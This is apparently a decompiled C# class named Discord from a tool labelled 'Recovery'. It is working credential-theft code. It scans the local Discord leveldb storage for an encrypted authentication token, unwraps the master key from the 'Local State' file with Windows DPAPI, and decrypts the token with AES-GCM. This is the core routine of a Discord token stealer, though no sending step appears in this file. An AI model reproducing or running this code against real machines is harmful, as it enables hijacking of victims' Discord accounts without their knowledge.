using System;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Recovery
{
	// Token: 0x02000004 RID: 4
	internal class Discord
	{
		// Token: 0x06000008 RID: 8 RVA: 0x0000268C File Offset: 0x0000088C
		public static string t0ken()
		{
			string result = "";
			Regex regex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\", "*.ldb", SearchOption.AllDirectories);
			foreach (string fileName in files)
			{
				FileInfo fileInfo = new FileInfo(fileName);
				string input = File.ReadAllText(fileInfo.FullName);
				Match match = regex.Match(input);
				bool success = match.Success;
				if (success)
				{
					result = Discord.DecryptToken(Convert.FromBase64String(match.Value.Split(new string[]
					{
						"dQw4w9WgXcQ:"
					}, StringSplitOptions.None)[1]));
				}
			}
			return result;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x0000275C File Offset: 0x0000095C
		private static byte[] DecyrptKey(string path)
		{
			object arg = JsonConvert.DeserializeObject(File.ReadAllText(path));
			if (Discord.<>o__1.<>p__2 == null)
			{
				Discord.<>o__1.<>p__2 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Discord)));
			}
			Func<CallSite, object, string> target = Discord.<>o__1.<>p__2.Target;
			CallSite <>p__ = Discord.<>o__1.<>p__2;
			if (Discord.<>o__1.<>p__1 == null)
			{
				Discord.<>o__1.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "encrypted_key", typeof(Discord), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			Func<CallSite, object, object> target2 = Discord.<>o__1.<>p__1.Target;
			CallSite <>p__2 = Discord.<>o__1.<>p__1;
			if (Discord.<>o__1.<>p__0 == null)
			{
				Discord.<>o__1.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "os_crypt", typeof(Discord), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			return ProtectedData.Unprotect(Convert.FromBase64String(target(<>p__, target2(<>p__2, Discord.<>o__1.<>p__0.Target(Discord.<>o__1.<>p__0, arg)))).Skip(5).ToArray<byte>(), null, DataProtectionScope.CurrentUser);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002888 File Offset: 0x00000A88
		private static string DecryptToken(byte[] buffer)
		{
			byte[] array = buffer.Skip(15).ToArray<byte>();
			AeadParameters parameters = new AeadParameters(new KeyParameter(Discord.DecyrptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local State")), 128, buffer.Skip(3).Take(12).ToArray<byte>(), null);
			GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
			gcmBlockCipher.Init(false, parameters);
			byte[] array2 = new byte[gcmBlockCipher.GetOutputSize(array.Length)];
			gcmBlockCipher.DoFinal(array2, gcmBlockCipher.ProcessBytes(array, 0, array.Length, array2, 0));
			return Encoding.UTF8.GetString(array2).TrimEnd("\r\n\0".ToCharArray());
		}
	}
}
